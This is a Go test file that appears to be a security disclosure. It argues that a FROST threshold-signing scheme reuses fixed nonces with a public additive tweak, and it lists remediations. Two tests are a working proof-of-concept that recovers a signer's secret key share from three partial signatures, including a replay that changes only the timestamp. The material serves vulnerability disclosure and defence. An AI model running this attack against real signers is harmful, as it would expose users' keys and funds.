package main

// ============================================================================
// SECURITY ANALYSIS: secret-share recovery from related FROST nonces
// ============================================================================
//
// SUMMARY
// -------
// The signing scheme is catastrophically broken in all three signer
// implementations (TS/@frostr/bifrost, Go, Rust). An operator's secret FROST
// share is algebraically recoverable from just THREE partial signatures. A
// coordinator that does this against `threshold` operators reconstructs the
// full user key. The two tests below run the REAL Go signer code path
// (createPsigPkg) and recover the victim's share exactly.
//
// This is a result of a single FIXED nonce pair being reused
// for the entire life of a session, and each per-message nonce is a PUBLIC,
// LINEAR function of it. That makes the partial signatures linear in the
// operator's fixed secrets, which a few signatures then solve for.
//
// THE DESIGN
// ----------
// Each share stores FIXED secret nonces hidden_sn (h) and binder_sn (g) at
// registration (PROTOCOL.md "Registration"); they are never rotated. For every
// /sign, the per-message secret nonce is derived by an ADDITIVE tweak with a
// fully public value:
//
//	bind_hash  e = SHA256(sid || idx || sighash)
//	             session.go:127, session.rs:67, bifrost module.mjs:10304
//	hidden_sn' = h + e      (additive: helpers.go:44, helpers.rs:46,
//	binder_sn' = g + e       bifrost's own tweak_seckey module.mjs:9908)
//
// where sid = SHA256(gid || members || hashes || content || type || stamp),
// computeSessionID at session.go:99.
//
// THE LEAK
// --------
// The partial signature (sign.go:56-61) for victim member i in session j is:
//
//	ps_j = (challenge_j · λ · parity_j · state_j) · x
//	       + s_j · [ h + g·ρ_j + e_j·(1 + ρ_j) ]
//
//	x        = the secret share              (FIXED, unknown)
//	h, g     = the base secret nonces        (FIXED, unknown)
//	challenge_j, λ, parity_j, state_j        (PUBLIC)
//	ρ_j      = bind factor                   (PUBLIC)
//	e_j      = bind_hash tweak               (PUBLIC)
//	s_j      = ±1 from group-nonce parity    (PUBLIC)
//
// Moving the fully-known e_j·(1+ρ_j) term to the left gives, per session, one
// LINEAR equation in the three FIXED unknowns (x, h, g) with PUBLIC
// coefficients:
//
//	P_j := ps_j − s_j·e_j·(1+ρ_j) = A_j·x + s_j·h + (s_j·ρ_j)·g
//	with A_j = challenge_j·λ·parity_j·state_j
//
// The deterministic tweak adds a KNOWN offset, not fresh secret entropy, so —
// unlike real FROST, where each signature introduces two brand-new unknown
// nonce scalars — the unknown set never grows past (x, h, g). Three sessions
// with linearly independent coefficient rows yield a 3×3 system; invert it (mod
// the curve order N) and read off x. The share has TWO secret nonce components
// (h and g), which is the only reason it takes 3 signatures rather than the 2
// that classic ECDSA/Schnorr nonce reuse needs. This is a standard
// related-nonce break.
//
// WHY THE NONCE BINDING DOESN'T SAVE IT
// -------------------------------------
// The nonce IS bound to the sighash, so a DIFFERENT message yields a DIFFERENT
// nonce. But the bind_hash also folds in sid, and sid
// folds in attacker-controlled, message-INDEPENDENT fields: stamp, content,
// type. So a malicious coordinator does not need the user to sign three
// different things. It can REPLAY ONE signing request for the SAME message,
// bumping only `stamp`, and harvest three DISTINCT-but-RELATED nonces. The user
// never consents to anything new. TestNonceReuseLeaksShare_ReplaySameMessage-
// DifferentStamp proves exactly this against the real code path.
//
// PER-IMPLEMENTATION STATUS
// -------------------------
//   - TS   (signer.ts:643): vulnerable; _handleSign does NOT call
//     verify_session_pkg and derives nonces from the client-supplied sid
//     directly — weakest, the attacker can set sid to anything.
//   - Go   (signer.go:518): vulnerable; DOES call verifySessionPkg and
//     recomputes sid, but that is no defense — `stamp` is a legitimate signed
//     field the attacker varies freely (proven by the stamp-replay test).
//   - Rust (signer.rs:754): vulnerable; verify_session_pkg exists but is only
//     used in tests, not in handle_sign. Recomputes sid like Go; same `stamp`
//     bypass.
//
// Rate limiting (100 sign/min, signer.go:25) is irrelevant: the attack needs
// only 3 requests and completes in well under a second.
//
// WHY "SINGLE-USE NONCES / REFUSE TO RE-SIGN" DOES NOT FIX IT
// ----------------------------------------------------------
// The attack uses three DISTINCT sessions (distinct sid). They look like three
// legitimate fresh signing requests, not re-signs, so a "refuse to re-sign the
// same sid" guard sees three different sids and allows all of them. Re-signing
// the SAME sid is already harmless (deterministic → identical psig). The root
// cause is architectural: non-interactive signing from a stored, reused nonce
// is fundamentally incompatible with FROST nonce hygiene.
//
// REMEDIATION (in rough order of soundness)
//  1. Make signing interactive: generate and commit a FRESH (hidden_sn,
//     binder_sn) per signing session, never reused, deleted after use. This is
//     real FROST round 1; sound, but costs a round trip.
//  2. Pre-issued single-use nonce pool: the client pre-registers a large batch
//     of one-time commitments; the signer consumes one per signature and
//     refuses on exhaustion or any index reuse. Keeps one-shot signing at the
//     cost of per-session state and a hard refusal path.
//  3. If neither is acceptable, do not use this scheme for signing at all
//     (recovery-only usage never exposes partial signatures).
//
// This is an upstream @frostr/bifrost design issue, not merely a Pomade bug; a
// real fix likely needs coordination there.
//
// ----------------------------------------------------------------------------
// The tests below are the executable proof of the analysis above. They exercise
// the real createPsigPkg() path in session.go and recover (x, h, g) exactly.
// ----------------------------------------------------------------------------

import (
	"crypto/sha256"
	"encoding/hex"
	"math/big"
	"testing"

	"github.com/frost-taproot/frost-taproot-go/commit"
	"github.com/frost-taproot/frost-taproot-go/ecc"
	"github.com/frost-taproot/frost-taproot-go/frost"
	"github.com/frost-taproot/frost-taproot-go/poly"
	"github.com/frost-taproot/frost-taproot-go/types"
)

func sadd(a, b *big.Int) *big.Int { return ecc.ScalarAdd(a, b) }
func ssub(a, b *big.Int) *big.Int { return ecc.ScalarSub(a, b) }
func smul(a, b *big.Int) *big.Int { return ecc.ScalarMul(a, b) }

// solve3 solves M*[x] = p (3x3) mod N via Cramer's rule.
func solve3(M [3][3]*big.Int, p [3]*big.Int) ([3]*big.Int, bool) {
	det := det3(M)
	if det.Sign() == 0 {
		return [3]*big.Int{}, false
	}
	dinv, err := ecc.ScalarInvert(det)
	if err != nil {
		return [3]*big.Int{}, false
	}
	var out [3]*big.Int
	for col := 0; col < 3; col++ {
		Mc := M
		for row := 0; row < 3; row++ {
			Mc[row][col] = p[row]
		}
		out[col] = smul(det3(Mc), dinv)
	}
	return out, true
}

func det3(m [3][3]*big.Int) *big.Int {
	a := smul(m[0][0], ssub(smul(m[1][1], m[2][2]), smul(m[1][2], m[2][1])))
	b := smul(m[0][1], ssub(smul(m[1][0], m[2][2]), smul(m[1][2], m[2][0])))
	c := smul(m[0][2], ssub(smul(m[1][0], m[2][1]), smul(m[1][1], m[2][0])))
	return ssub(sadd(a, c), b)
}

// dealVictim sets up a 2-of-3 group and returns the signer-side Group, the
// victim's Share (member index 1), the signing member set, and the victim's
// true (x, h, g) scalars for verification.
func dealVictim(t *testing.T) (Group, Share, uint32, []uint32, *big.Int, *big.Int, *big.Int) {
	t.Helper()
	secrets := [][32]byte{{0x11}, {0x22}}
	pkg, err := frost.GenerateDealerPackage(2, 3, secrets)
	if err != nil {
		t.Fatal(err)
	}

	commits := make([]types.CommitmentPackage, len(pkg.Shares))
	for i, s := range pkg.Shares {
		ss := types.SecretShare{ID: s.Idx, Seckey: s.Seckey}
		commits[i] = commit.CreateCommitPkg(&ss, nil, nil)
	}

	group := Group{GroupPk: hex.EncodeToString(pkg.Group.GroupPk[:]), Threshold: 2}
	for i, s := range pkg.Shares {
		pubkey := pkg.Group.Members[i].Pubkey
		group.Commits = append(group.Commits, Commit{
			Idx:      s.Idx,
			Pubkey:   hex.EncodeToString(pubkey[:]),
			HiddenPn: hex.EncodeToString(commits[i].HiddenPn[:]),
			BinderPn: hex.EncodeToString(commits[i].BinderPn[:]),
		})
	}

	victimIdx := pkg.Shares[0].Idx
	victimShare := Share{
		Idx:      victimIdx,
		HiddenSn: hex.EncodeToString(commits[0].HiddenSn[:]),
		BinderSn: hex.EncodeToString(commits[0].BinderSn[:]),
		Seckey:   hex.EncodeToString(pkg.Shares[0].Seckey[:]),
	}
	members := []uint32{pkg.Shares[0].Idx, pkg.Shares[1].Idx}

	return group, victimShare, victimIdx,
		members,
		ecc.ScalarFromBytes(pkg.Shares[0].Seckey),
		ecc.ScalarFromBytes(commits[0].HiddenSn),
		ecc.ScalarFromBytes(commits[0].BinderSn)
}

// signAndBuildEquation runs the *real* createPsigPkg() path for one request and
// returns the linear-equation row [A, s, s*rho] and rhs P such that
// P = A*x + s*h + s*rho*g, using only data available to the attacker.
func signAndBuildEquation(t *testing.T, group Group, victimShare Share, victimIdx uint32, inner SignRequestInner) ([3]*big.Int, *big.Int) {
	t.Helper()
	gid := computeGroupID(group)
	sid := computeSessionID(group, inner)
	inner.Gid = hex.EncodeToString(gid[:])
	inner.Sid = hex.EncodeToString(sid[:])
	sigvec := inner.Hashes[0]

	res, ok := createPsigPkg(group, SignRequest{Request: inner}, victimShare)
	if !ok {
		t.Fatal("createPsigPkg failed")
	}
	psBytes, ok := decodeHex32(res.Psigs[0][1])
	if !ok {
		t.Fatal("bad psig hex")
	}
	ps := ecc.ScalarFromBytes(psBytes)

	ctxs, ok := buildSighashContexts(group, inner, sid)
	if !ok {
		t.Fatal("buildSighashContexts failed")
	}
	ctx := ctxs[0].ctx

	challenge := ecc.ScalarFromBytes(ctx.Challenge)
	parity := ecc.ScalarFromBytes(ctx.GroupPt.Parity)
	state := ecc.ScalarFromBytes(ctx.GroupPt.State)

	rhoBytes, err := commit.GetBindFactor(ctx.BindFactors, victimIdx)
	if err != nil {
		t.Fatal(err)
	}
	rho := ecc.ScalarFromBytes(rhoBytes)

	idxScalars := make([]*big.Int, len(ctx.Indexes))
	for k, id := range ctx.Indexes {
		idxScalars[k] = poly.IndexToScalar(id)
	}
	lambda, err := poly.InterpolateX(idxScalars, poly.IndexToScalar(victimIdx))
	if err != nil {
		t.Fatal(err)
	}

	e := ecc.ScalarFromBytes(getSighashBinder(sid, victimIdx, sigvec))

	rElem, err := ecc.LiftX(ctx.GroupPn[:])
	if err != nil {
		t.Fatal(err)
	}
	s := big.NewInt(1)
	if !ecc.HasEvenY(rElem) {
		s = ecc.ScalarNeg(big.NewInt(1))
	}

	// ps = (challenge*lambda*parity*state)*x + s*[ h + rho*g + e*(1+rho) ]
	A := smul(smul(challenge, lambda), smul(parity, state))
	Pj := ssub(ps, smul(s, smul(e, sadd(big.NewInt(1), rho))))
	return [3]*big.Int{A, s, smul(s, rho)}, Pj
}

func recoverAndCheck(t *testing.T, M [3][3]*big.Int, P [3]*big.Int, trueX, trueH, trueG *big.Int) {
	t.Helper()
	sol, ok := solve3(M, P)
	if !ok {
		t.Fatal("singular system (unexpected)")
	}
	recX, recH, recG := sol[0], sol[1], sol[2]
	t.Logf("true  share seckey: %x", ecc.ScalarToBytes(trueX))
	t.Logf("recov share seckey: %x", ecc.ScalarToBytes(recX))
	if recX.Cmp(trueX) != 0 || recH.Cmp(trueH) != 0 || recG.Cmp(trueG) != 0 {
		t.Fatalf("recovery failed")
	}
	t.Log("SUCCESS: recovered victim's secret share + both base nonces")
}

// Attack 1: the user legitimately signs 3 DISTINCT messages with the same
// member set. Three partial signatures leak the share.
func TestNonceReuseLeaksShare_DistinctMessages(t *testing.T) {
	group, victimShare, victimIdx, members, trueX, trueH, trueG := dealVictim(t)
	var M [3][3]*big.Int
	var P [3]*big.Int
	for j := 0; j < 3; j++ {
		sh := sha256.Sum256([]byte{'m', 's', 'g', byte('1' + j)})
		inner := SignRequestInner{
			Hashes:  [][]string{{hex.EncodeToString(sh[:])}},
			Members: members,
			Stamp:   1000,
			Type:    "message",
		}
		M[j], P[j] = signAndBuildEquation(t, group, victimShare, victimIdx, inner)
	}
	recoverAndCheck(t, M, P, trueX, trueH, trueG)
}

// Attack 2 (stronger): a malicious central REPLAYS ONE signing request for the
// SAME message, perturbing only the attacker-controlled `stamp` field. Each
// replay yields a fresh related nonce; 3 replays leak the share without the
// user ever agreeing to sign anything new.
func TestNonceReuseLeaksShare_ReplaySameMessageDifferentStamp(t *testing.T) {
	group, victimShare, victimIdx, members, trueX, trueH, trueG := dealVictim(t)
	sh := sha256.Sum256([]byte("the one and only message the user signed"))
	var M [3][3]*big.Int
	var P [3]*big.Int
	for j := 0; j < 3; j++ {
		inner := SignRequestInner{
			Hashes:  [][]string{{hex.EncodeToString(sh[:])}}, // identical message
			Members: members,
			Stamp:   uint64(1000 + j), // attacker only changes the timestamp
			Type:    "message",
		}
		M[j], P[j] = signAndBuildEquation(t, group, victimShare, victimIdx, inner)
	}
	recoverAndCheck(t, M, P, trueX, trueH, trueG)
}
